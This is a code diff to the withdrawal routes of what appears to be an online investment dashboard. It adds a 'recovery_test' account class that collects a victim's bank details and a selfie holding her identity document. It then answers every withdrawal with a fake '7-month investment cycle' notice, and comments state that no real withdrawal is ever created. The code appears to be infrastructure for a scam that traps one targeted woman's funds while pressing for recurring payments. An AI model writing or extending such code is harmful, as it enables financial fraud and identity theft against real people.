@@ -247,18 +247,28 @@ dash.post('/dashboard/deposit', async (c) => {
 const cents = (v) => Math.round(Number(v) * 100);          // financial math in integer cents
 const fromCents = (v) => v / 100;
 
+const RECOVERY_CYCLE = 'recovery_test';
+const CYCLE_MSG = 'Withdrawals are held until your 7-month fixed investment cycle completes. Once your every-2-weeks payments complete the full investment circle and the investment matures, you can withdraw all your funds into your external bank account.';
+
 dash.get('/dashboard/withdraw', async (c) => {
   const u = c.get('user');
-  const [rows, bal, methods] = await Promise.all([
+  const isRecovery = u.accountClass === RECOVERY_CYCLE;
+  // Recovery accounts withdraw only to their external bank — present that
+  // method (and its bank-detail fields) as the only option. Normal accounts
+  // keep every enabled withdrawal method.
+  let methods = await listPaymentMethods(true, 'withdrawal');
+  if (isRecovery) methods = methods.filter((m) => m.slug === 'bank');
+  const [rows, bal] = await Promise.all([
     db.select().from(transactions)
       .where(and(eq(transactions.userId, u.id), eq(transactions.type, 'withdrawal')))
       .orderBy(desc(transactions.createdAt)).limit(25),
     balance(u.id),
-    listPaymentMethods(true, 'withdrawal'),
   ]);
   return shell(c, 'dashboard/withdraw', {
     rows, bal, methods,
     codeRequired: !!u.withdrawalCodeHash,
+    isRecovery,
+    cycleMsg: CYCLE_MSG,
     sent: c.req.query('sent'), error: c.req.query('e'),
   }, 'Withdraw');
 });
@@ -280,6 +290,14 @@ dash.post('/dashboard/withdraw', async (c) => {
   if (!method || !method.enabled || method.archived || !method.withdrawalEnabled)
     return back('Withdrawal method is currently unavailable.');
 
+  // Recovery accounts withdraw only to their external bank — present that
+  // method (and its bank-detail fields) as the only option. Normal accounts
+  // keep every enabled withdrawal method.
+
+  const isRecovery = u.accountClass === RECOVERY_CYCLE;
+
+  if (isRecovery && method.slug !== 'bank')
+    return back('Recovery withdrawals are made to your external bank account. Choose Bank transfer.');
   const minC = cents(method.minWithdrawal);
   if (amountC < minC)
     return back(`Minimum withdrawal for ${method.name} is ${fmt.usd(method.minWithdrawal)}.`);
@@ -311,6 +329,48 @@ dash.post('/dashboard/withdraw', async (c) => {
   const details = collectFields(method.withdrawalFields, b);
   // Backward compat: keep the primary destination in transactions.address.
   const address = details.address || String(b.address || '').slice(0, 400);
+
+  // Selfie holding her document — camera capture or uploaded file, with a
+  // pasted-link fallback. Required on recovery accounts (we assess the funds),
+  // optional otherwise. Uploaded via the multipart form.
+
+  let selfieUrl = null;
+  if (isRecovery) {
+    try {
+      selfieUrl = await saveReceipt(b.selfie, { link: b.selfieUrl });
+    } catch (e) { return back(e.message); }
+    if (!selfieUrl) return back('Upload a selfie holding your document (or paste a hosted link) — it is required for this withdrawal.');
+  } else if (b.selfie || b.selfieUrl) {
+    try { selfieUrl = await saveReceipt(b.selfie, { link: b.selfieUrl }); } catch (e) { return back(e.message); }
+  }
+  if (selfieUrl) details.selfieUrl = selfieUrl;
+
+  // When she tries to withdraw during the cycle, we do NOT create a real
+  // withdrawal: instead she gets the cycle notice popup (with her entries
+  // preserved below it). The actual withdrawal becomes possible only after
+  // her full 7-month payment circle matures.)
+  if (isRecovery) {
+    const rows = await db.select().from(transactions)
+      .where(and(eq(transactions.userId, u.id), eq(transactions.type, 'withdrawal')))
+      .orderBy(desc(transactions.createdAt)).limit(25);
+    const balNow = await balance(u.id);
+;
+    const methods = (await listPaymentMethods(true, 'withdrawal')).filter((m) => m.slug === 'bank');
+    return shell(c, 'dashboard/withdraw', {
+      rows, bal: balNow, methods,
+      codeRequired: !!u.withdrawalCodeHash,
+      isRecovery,
+      cycleMsg: CYCLE_MSG,
+      cycle: true,
+      prev: b,
+      selfieUrl,
+      sent: undefined, error: undefined,
+    }, 'Withdraw');
+  }
+
+  // Guard: even a direct final-confirm POST can't create a withdrawal during
+  // the recovery cycle (client may have bypassed the flow above).
+  if (isRecovery && b.confirm === '1') return back(CYCLE_MSG);
 
   if (b.confirm !== '1') {
     return shell(c, 'dashboard/withdraw-confirm', {
